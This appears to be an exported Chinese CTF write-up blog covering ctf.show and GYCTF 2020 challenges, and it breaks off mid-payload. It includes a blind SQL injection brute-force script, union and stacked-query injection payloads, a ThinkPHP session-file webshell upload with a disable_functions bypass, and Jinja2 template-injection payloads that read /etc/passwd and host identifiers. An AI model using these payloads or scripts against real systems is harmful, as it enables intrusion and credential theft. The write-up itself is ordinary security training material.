<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u&#x3D;&#39;||xxx||&#39;&amp;p&#x3D;123</span><br><span class="line">#第一个随便写的,尝试一下发现报错,unknown column</span><br><span class="line">#于是再试</span><br><span class="line">u&#x3D;&#39;||u||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(u)&lt;5||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(u)&lt;6||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(pwd)||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(password)||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(p)||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(p)&lt;17||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(p)&lt;18||&#39;&amp;p&#x3D;123</span><br></pre></td></tr></table></figure>
<p>上面这些可以得到一些信息,表中字段是u,p,账号是admin,密码是17位</p>
<p>然后就是利用相同原理进行盲注了脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;30f04198-23e0-4a0e-a14d-e29e8a13aea6.chall.ctf.show&#x2F;admin&#x2F;checklogin.php&quot;</span><br><span class="line"></span><br><span class="line">def get_length():</span><br><span class="line">    for i in range(1,127):</span><br><span class="line">        postdata &#x3D; &#123;</span><br><span class="line">            &#39;u&#39;:&quot;&#39;||length(p)&lt;&quot;+str(i)+&quot;||&#39;&quot;,</span><br><span class="line">            &#39;p&#39;:&#39;123&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        print(i,postdata)</span><br><span class="line">        r &#x3D; s.post(url,data&#x3D;postdata)</span><br><span class="line">        if &#39;用户名&#39;not in r.text:</span><br><span class="line">            print(&quot;get length! length&#x3D;&quot;+str(i-1))</span><br><span class="line">            return i</span><br><span class="line">def get_pwd_char():</span><br><span class="line">    pwd &#x3D; &#39;&#39;</span><br><span class="line">    strs &#x3D; &#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">    for i in range(0,length):</span><br><span class="line">        for c in strs:</span><br><span class="line">            postdata &#x3D; &#123;</span><br><span class="line">                &#39;u&#39;:&quot;&#39;||substr(p,&quot;+str(i+1)+&quot;,1)&lt;&#39;&quot;+str(c),</span><br><span class="line">                &#39;p&#39;:&#39;123&#39;</span><br><span class="line">            &#125;</span><br><span class="line">            # print(i,postdata)</span><br><span class="line">            r &#x3D; s.post(url&#x3D;url,data&#x3D;postdata)</span><br><span class="line">            # print(r.text)</span><br><span class="line">            if &#39;用户名&#39; not in r.text and &#39;密码&#39; in r.text:</span><br><span class="line">                pwd +&#x3D; chr(ord(c)-1)</span><br><span class="line">                # print(pwd)</span><br><span class="line">                break</span><br><span class="line">            print(chr(ord(c) - 1),end&#x3D;&#39;&#39;)</span><br><span class="line">        print(&quot;||&quot;+str(i+1),pwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    length&#x3D;0</span><br><span class="line">    length&#x3D;get_length() #length is 17</span><br><span class="line">    get_pwd_char()</span><br></pre></td></tr></table></figure>
<p>得到密码,登录得flag</p>
<h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p>页面另存为,winhex打开,最下面诡异的20 09,20变0,09变1,转换成二进制,二进制转ASCII发现是morse,morse解码,base16解密</p>
<p>得flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;MengMengDa&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项萌新福利"><a href="#杂项萌新福利" class="headerlink" title="杂项萌新福利"></a>杂项萌新福利</h3><p>下下来,bin文件,不知道是什么东西,百度一个文件格式分析,是ABR,用ps打开,不兼容,群主提示取反,用010editor对十六进制按位取反,保存,再分析一下,可能是MP3,MP4用potplay打开,听出flag</p>
<h3 id="杂项qrcode"><a href="#杂项qrcode" class="headerlink" title="杂项qrcode"></a>杂项qrcode</h3><p>转换二维码脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">MAX &#x3D; 25</span><br><span class="line">img &#x3D; Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line">str&#x3D;&quotquot;</span><br><span class="line">i &#x3D; 0</span><br><span class="line">for y in range (0,MAX):</span><br><span class="line">    for x in range (0,MAX):</span><br><span class="line">        if(str[i] &#x3D;&#x3D; &#39;1&#39;):</span><br><span class="line">            img.putpixel([x,y],(0, 0, 0))</span><br><span class="line">        else:</span><br><span class="line">            img.putpixel([x,y],(255,255,255))</span><br><span class="line">        i &#x3D; i+1</span><br><span class="line">img.show()</span><br><span class="line">img.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="杂项-千字文"><a href="#杂项-千字文" class="headerlink" title="杂项,千字文"></a>杂项,千字文</h3><p>用Stegsolve打开,换换通道看看,多点几下,发现一个很多细小二维码的图片,另存为,</p>
<p>首先用切割软件切了,结果识别不出来,再用python切割,脚本网上都有,找一个改一改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">filename &#x3D; r&#39;2.bmp&#39;</span><br><span class="line">img &#x3D; Image.open(filename)</span><br><span class="line">for i in range(29):</span><br><span class="line">    for j in range(29):</span><br><span class="line">        region &#x3D; img.crop(25 * j, 25 * i, 25 * (j + 1), 25 * (i + 1))</span><br><span class="line">        region.save(&#39;out&#x2F;&#123;&#125;&#123;&#125;.png&#39;.format(j, i))</span><br></pre></td></tr></table></figure>
<p>再用群里大佬分享的微微批量识别,在csv文件查找flag</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="密码学签到"><a href="#密码学签到" class="headerlink" title="密码学签到"></a>密码学签到</h3><p>base85得flag</p>
<h3 id="抱我"><a href="#抱我" class="headerlink" title="抱我"></a>抱我</h3><p>分析逻辑,每11位位一组,第一位是没用的字符,去掉第一位,剩下的就是flag中的字符,先遍历出flag中的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">cstring &#x3D; &#39;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#39;</span><br><span class="line">key &#x3D; &#39;flag&#123;********&#125;&#39;</span><br><span class="line">length &#x3D; 300</span><br><span class="line"></span><br><span class="line">def encode():</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1, length):</span><br><span class="line">        c &#x3D; random.randint(0, 36)</span><br><span class="line">        # print(c)</span><br><span class="line">        res +&#x3D; cstring[c]</span><br><span class="line">        # print(res)</span><br><span class="line">        for n in range(10):</span><br><span class="line">            c &#x3D; random.randint(0, len(key) - 1)</span><br><span class="line">            res +&#x3D; key[c]</span><br><span class="line">            # print(res)</span><br><span class="line">    return res</span><br><span class="line"># encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str &#x3D; &quot;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&quot;</span><br><span class="line">lengths &#x3D; len(str)</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(0, lengths):</span><br><span class="line">    if i % 11 !&#x3D; 0:</span><br><span class="line">        if str[i] not in flag:</span><br><span class="line">            flag +&#x3D; str[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>再把结果中的几个字符拼成一句话</p>
<h3 id="妈呀-完了"><a href="#妈呀-完了" class="headerlink" title="妈呀_完了"></a>妈呀_完了</h3><p>群主提示就差把答案说出来了.二进制转ascii得到密文,AES加解密,密匙是20121221得flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF——2020i春秋新春战疫CTF——网络安全公益赛</title>
    <url>/2020/02/25/CTF_WP/gyctf_wp/</url>
    <content><![CDATA[<h1 id="GYCTF——2020i春秋新春战疫CTF——网络安全公益赛"><a href="#GYCTF——2020i春秋新春战疫CTF——网络安全公益赛" class="headerlink" title="GYCTF——2020i春秋新春战疫CTF——网络安全公益赛"></a>GYCTF——2020i春秋新春战疫CTF——网络安全公益赛</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="code-in-morse"><a href="#code-in-morse" class="headerlink" title="code_in_morse"></a>code_in_morse</h3><p>下载下来是压缩包,解压是流量包,用wireshark分析,过滤http</p>
<p>发现上传文件的upload.php,跟踪流里面是morse码,morse解码是一堆字母加数字,很像base64,但是其中没有1没有8数字只要2-7,因为上传的是文件,base32解码成文件,下面这个工具解码得到一个图片</p>
<a id="more"></a>

<p><a href="https://emn178.github.io/online-tools/base32_decode_file.html">Base32 Decode File</a></p>
<p>图片不知道是什么,用google识图搜索后发现一种很类似的条形码格式PDF417,随认为是该种条形码,用一下工具进行识别,识别出一个网站,网站是一张图片</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/yz1DwxX4ETFj.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/yz1DwxX4ETFj.png?imageslim" alt="mark"></a></p>
<p><a href="https://online-barcode-reader.inliteresearch.com/">条形码二维码识别</a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/s4EqXhqUH5Lx.jpg?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/s4EqXhqUH5Lx.jpg?imageslim" alt="mark"></a></p>
<p>Stegsolve分析文件格式出现F5,是F5隐写,用GitHub的F5隐写工具解密,没有密码,得到flag</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>这个题拿到手先是一个登录框,尝试了万能密码什么的发现总是未知错误,以为是我的原因,经群里大佬提醒容器不稳定,重新下发,发现万能密码登录成功</p>
<p>浏览各个页面发现AdminPage有一个serach for key的查询框</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200223/tX2ll5OsA5JH.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200223/tX2ll5OsA5JH.png?imageslim" alt="mark"></a></p>
<p>尝试sql注入,有回显,有错误提示,直接有回显的sql注入一套,得flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 order by 5#</span><br><span class="line">&#39; or 1&#x3D;1 order by 6#</span><br><span class="line">#5有回显,6没有</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,2,3,4,5#</span><br><span class="line">#admin变成2,输出位置在2</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(database()),3,4,5#</span><br><span class="line">#查库</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line">#查表</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39;#</span><br><span class="line">#查字段</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(flaaag),3,4,5 from flag#</span><br><span class="line">#查内容</span><br></pre></td></tr></table></figure>
<h3 id="equpload"><a href="#equpload" class="headerlink" title="equpload"></a>equpload</h3><p>这个题也很简单,直接上传一句话getshell,读取根目录下面的flag</p>
<p>(没有任何过滤?不知道是不是主办方的失误,无从得知)</p>
<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>过滤了set|prepare|alter|rename|select|update|delete|drop|insert|where|</p>
<p>但是mysql还有一种查询姿势</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show tables;</span><br><span class="line">#查表</span><br><span class="line">1&#39;;desc FlagHere;</span><br><span class="line">#查字段</span><br><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br><span class="line">#读取内容</span><br></pre></td></tr></table></figure>
<h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>这个利用的是ThinkPHP&lt;6.0.2的一个任意文件内容写入覆盖漏洞</p>
<p>可以通过控制cookies中的PHPSESSIONID字段内容来达到控制session目录下生成的文件名</p>
<p>详情可以查看</p>
<p><a href="https://zhzhdoai.github.io/2020/01/25/ThinkPHP-6-0-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5-%E8%A6%86%E7%9B%96/">ThinkPHP&lt;6.0.2任意文件内容写入/覆盖</a></p>
<p>网站目录下有<a href="http://www.zip.下载下来查看控制器文件,发现session文件内容存储的是查询页的key值/">www.zip.下载下来查看控制器文件,发现session文件内容存储的是查询页的key值</a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/ukzBO4Dx1y7G.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/ukzBO4Dx1y7G.png?imageslim" alt="mark"></a></p>
<p>注册,登录,构造查询页面的key为一句话木马,cookies下面的PHPSESSIONID字段PHPSESSID=1234567890123456789012345678.php</p>
<p>然后访问用蚁剑链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.57.212.112:7891&#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php</span><br></pre></td></tr></table></figure>
<p>getshell</p>
<p>查看php.ini是禁用了系统执行函数的,这时需要使用蚁剑的绕过disable_function的插件选择模式进行链接,成功绕过disable_function后即可执行根目录下面readflag</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/r28i0E1LN2MG.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/r28i0E1LN2MG.png?imageslim" alt="mark"></a></p>
<h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p>在decode亚目输入123发现debug页面,分析页面,得出页面路径</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/rf8WEDdNCYa4.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/rf8WEDdNCYa4.png?imageslim" alt="mark"></a></p>
<p>得出formate格式化字符串漏洞,配合发现jinja2模板注入</p>
<p>尝试去获取6个变量值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username # 用户名</span><br><span class="line">modname # flask.app</span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask</span><br><span class="line">getattr(mod, &#39;__file__&#39;, None) # flask目录下的一个app.py的绝对路径</span><br><span class="line">uuid.getnode() # mac地址十进制</span><br><span class="line">get_machine_id() # &#x2F;etc&#x2F;machine-id</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果 ： root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">flaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfSAg</span><br><span class="line">MAC地址:02:42:ac:12:00:0a</span><br><span class="line">MAC地址十进制:2485377957898</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;, &#39;r&#39;).read() 